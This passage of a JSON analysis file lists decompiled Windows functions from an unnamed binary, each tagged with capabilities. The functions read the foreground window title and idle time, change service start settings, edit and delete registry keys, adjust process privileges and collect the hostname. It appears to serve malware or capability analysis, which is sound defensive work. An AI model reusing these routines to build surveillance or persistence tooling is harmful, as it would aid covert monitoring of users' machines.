{\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return;\n}\n",
        "token_count": 766
    },
    "00416af8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416af8(uint32_t param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *ppv;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (param_2 != NULL) {\n        uVar2 = fcn.0041649c();\n        if (uVar2 < param_1) {\n            param_1 = 0;\n        }\n        uVar2 = 0;\n        *param_2 = NULL;\n        (*_sym.imp.ole32.dll_CoCreateInstance)(0x419420, 0, 1, 0x41c870, &ppv);\n        if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x419410, &var_4h, 0),  var_4h != NULL)) {\n            (**(*var_4h + 0x14))(var_4h);\n            while( true ) {\n                var_8h = 0;\n                iVar3 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, &var_8h);\n                if (iVar3 != 0) break;\n                (**(*var_ch + 0x20))(var_ch, 0, 0, 0x4193c0, param_2);\n                piVar1 = *param_2;\n                if (piVar1 != NULL) {\n                    if (uVar2 == param_1) break;\n                    uVar2 = uVar2 + 1;\n                    (**(*piVar1 + 8))(piVar1);\n                    *param_2 = NULL;\n                }\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 8))(var_4h);\n                var_4h = NULL;\n            }\n            if (ppv != NULL) {\n                (**(*ppv + 8))(ppv);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "00416c8f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c8f(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    fcn.00416d09(param_1);\n    uVar1 = 0;\n    if (param_1[3] != 0) {\n        do {\n            fcn.00406d65();\n            if (*(param_1[1] + uVar1 * 4) != 0) {\n                fcn.0041700f();\n                fcn.00406f8d();\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_1[3]);\n    }\n    if (*param_1 != 0) {\n        fcn.004166ec();\n        fcn.00406f8d();\n    }\n    fcn.00402d86();\n    return;\n}\n",
        "token_count": 198
    },
    "00406d65": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406d65(char param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"MessageBoxA\");\n    if (param_1 == '\\0') {\n        if (pcVar2 != NULL) {\n            (*pcVar2)(0, \"An assertion condition failed\", \"Assert\", 0x2010);\n        }\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(1);\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00409e8d": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e8d(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    if ((*0x5530f0 == NULL) || (*0x5530c8 == NULL)) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x419b90);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        *0x5530f0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"RtlNtStatusToDosError\");\n        *0x5530c8 = (*pcVar1)(uVar2, \"RtlSetLastWin32Error\");\n    }\n    pcVar1 = *0x5530c8;\n    if ((*0x5530f0 != NULL) && (*0x5530c8 != NULL)) {\n        uVar2 = (**0x5530f0)(arg_8h);\n        (*pcVar1)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00414a05": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00414a05(uint *param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32\", 0x41c328);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(*param_1, &var_4h);\n    }\n    return var_4h;\n}\n",
        "token_count": 132
    },
    "00407607": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407607(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    fcn.00407d95();\n    fcn.00407d69();\n    fcn.00407d95();\n    fcn.00407d69();\n    fcn.00407d95();\n    puVar2 = *(param_1 + 0x24);\n    if ((puVar2[2] != 0x7fff55aa) && (iVar3 = puVar2[2] + -1,  puVar2[2] = iVar3,  iVar3 < 1)) {\n        *puVar2 = *(param_1 + 4);\n        *(param_1 + 0x3c) = *(param_1 + 0x3c) + 1;\n        piVar1 = param_1 + 0x38;\n        *piVar1 = *piVar1 + -1;\n        *(param_1 + 4) = puVar2;\n        if (*piVar1 < 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "00407d69": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407d69(int32_t param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_2[2] != 0x7fff55aa) && (iVar2 = param_2[2] + -1,  param_2[2] = iVar2,  iVar2 < 1)) {\n        *param_2 = *(param_1 + 4);\n        *(param_1 + 0x3c) = *(param_1 + 0x3c) + 1;\n        piVar1 = param_1 + 0x38;\n        *piVar1 = *piVar1 + -1;\n        *(param_1 + 4) = param_2;\n        if (*piVar1 < 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00407d95": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407d95(int32_t param_1)\n\n{\n    int32_t extraout_ECX;\n    \n    if (*(param_1 + 8) != 0x7fff55aa) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        param_1 = extraout_ECX;\n    }\n    *(param_1 + 8) = 1;\n    return;\n}\n",
        "token_count": 93
    },
    "004133fb": {
        "rules": [
            "create directory"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004133fb(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHELL32.dll_SHCreateDirectoryExW)(0, *param_1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 62
    },
    "004057cf": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004057cf(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_224h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 8;\n    (*_sym.imp.USER32.dll_GetLastInputInfo)(&var_ch);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    (*_sym.imp.USER32.dll_GetWindowTextW)(uVar2, &var_224h, 0x100);\n    fcn.0040460a(&var_224h);\n    var_20h = 0;\n    var_24h = 0x15;\n    _var_1ch = ZEXT816(0);\n    fcn.00404767((iVar1 - var_8h) / 1000);\n    fcn.00404788(&var_4h);\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    fcn.00406f1d();\n    return arg_8h;\n}\n",
        "token_count": 292
    },
    "00414d78": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414d78(uint *lpValueName, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint lpType;\n    uint lpcbData;\n    \n    lpcbData = 0;\n    lpType = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, 0, &lpcbData);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401000(lpcbData);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, iVar1, &lpcbData);\n        if (iVar2 == 0) {\n            fcn.00403fc7(iVar1, lpcbData);\n            if (iVar1 != 0) {\n                fcn.00401014(iVar1);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 244
    },
    "00410df8": {
        "rules": [
            "get service handle",
            "modify service"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00410df8(uint *lpServiceName, uint dwStartType)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    uVar4 = uVar2;\n    if (uVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(uVar2, *lpServiceName, 2);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            uVar4 = 0;\n        }\n        else {\n            iVar5 = (*_sym.imp.ADVAPI32.dll_ChangeServiceConfigW)\n                              (iVar3, 0xffffffff, dwStartType, 0xffffffff, 0, 0, 0, 0, 0, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            uVar4 = iVar5 != 0;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            (*pcVar1)(iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 305
    },
    "00410ee9": {
        "rules": [
            "get service handle"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410ee9(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint pcbBytesNeeded;\n    \n    pcbBytesNeeded = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 1);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        }\n        else {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, 0, 0, &pcbBytesNeeded);\n            if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 == 0x7a)) {\n                iVar4 = fcn.00406f77();\n                iVar5 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, iVar4, pcbBytesNeeded, &pcbBytesNeeded);\n                pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                if (iVar5 != 0) {\n                    iVar5 = *(iVar4 + 4);\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                    (*pcVar1)(iVar3);\n                    fcn.00401014(iVar4);\n                    return iVar5;\n                }\n            }\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            (*pcVar1)(iVar3);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 426
    },
    "00414dee": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00414dee(uint *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    bool bVar2;\n    \n    if (*in_ECX == 0) {\n        bVar2 = false;\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(*in_ECX, *arg_8h, 0, arg_10h, *arg_ch, arg_ch[1]);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 140
    },
    "004132f4": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004132f4(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint PreviousState;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint NewState;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpLuid;\n    uint var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    PreviousState = 0;\n    TokenHandle = 0;\n    _lpLuid = 0;\n    ReturnLength = 0;\n    uStack48 = 0;\n    uStack44 = 0;\n    uStack40 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 0x28, &TokenHandle);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, *param_2, &lpLuid),  iVar1 != 0)) {\n        var_1ch = lpLuid;\n        NewState = 1;\n        var_18h = var_ch;\n        var_14h = 2;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)\n                          (TokenHandle, 0, &NewState, 0x10, &PreviousState, &ReturnLength);\n        return iVar1 != 0;\n    }\n    return false;\n}\n",
        "token_count": 329
    },
    "004136a5": {
        "rules": [
            "get memory capacity"
        ],
        "decompiled_code": "\nuint32_t fcn.004136a5(void)\n\n{\n    uint lpBuffer;\n    uint32_t var_38h;\n    int32_t var_34h;\n    \n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    return var_38h >> 0x14 | var_34h << 0xc;\n}\n",
        "token_count": 87
    },
    "004139ad": {
        "rules": [
            "get hostname"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004139ad(uint param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpBuffer;\n    uint nSize;\n    \n    nSize = 0x10;\n    puVar2 = &lpBuffer;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetComputerNameW)(&lpBuffer, &nSize);\n    fcn.0040460a(&lpBuffer);\n    return param_1;\n}\n",
        "token_count": 148
    },
    "00414ce8": {
        "rules": [
            "delete registry key"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00414ce8(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(0x80000001, *param_2);\n    return iVar1 == 0;\n}\n",
        "token_count": 69
    }
}